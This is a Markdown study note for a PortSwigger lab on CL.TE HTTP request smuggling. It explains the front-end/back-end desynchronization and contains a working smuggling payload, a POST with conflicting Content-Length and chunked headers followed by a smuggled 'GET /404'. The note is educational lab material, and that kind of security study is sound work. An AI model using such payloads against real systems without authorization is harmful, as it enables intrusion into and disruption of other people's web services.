# HTTP Request Smuggling - CL.TE

## Concept

HTTP Request Smuggling occurs when the front-end and back-end servers interpret the boundaries of an HTTP request differently, causing **HTTP desynchronization**.

This allows an attacker to "smuggle" a second HTTP request to the back-end.

---

## CL.TE

- **Front-end** ➜ Uses `Content-Length`
- **Back-end** ➜ Uses `Transfer-Encoding: chunked`

---

## How it works

### Front-end

Stops reading after the number of bytes specified in:

```http
Content-Length
```

### Back-end

Ignores `Content-Length` and processes the body as **Chunked Encoding**.

The request ends when it encounters:

```http
0
```

Anything after `0` is treated as a **new HTTP request**.

---

## Example Payload

```http
POST / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

---

## What happens?

```
Front-end
----------
POST Request
|
|---- Reads until Content-Length
|
+-----------------------------> Back-end


Back-end
---------
POST Request
|
|---- Stops at "0"
|
|---- Treats:

GET /404 HTTP/1.1

as a new request
```

---

## Why is `/404` used?

The lab doesn't exploit the vulnerability yet.

It simply confirms that the smuggled request reaches the back-end by causing the **next request** to produce a different response (404).

---

## Lab Notes

- Use **HTTP/1.1**, not HTTP/2.
- Add both:
  - `Content-Length`
  - `Transfer-Encoding: chunked`
- `0` terminates the chunked body.
- Everything after `0` becomes a new request from the back-end's perspective.
- The response to the payload itself is **not important**.
- Some labs require sending the payload more than once on the same connection.

---

## Key Idea

```
Front-end

POST
--------------------->

Reads using Content-Length


Back-end

POST
0
GET /404
--------------------->

Reads using Transfer-Encoding
```

---

## Summary

```
Front-end  -> Content-Length
Back-end   -> Transfer-Encoding

↓

Different request boundaries

↓

HTTP Desynchronization

↓

Request Smuggling
```

## References

- https://portswigger.net/web-security/request-smuggling
- https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses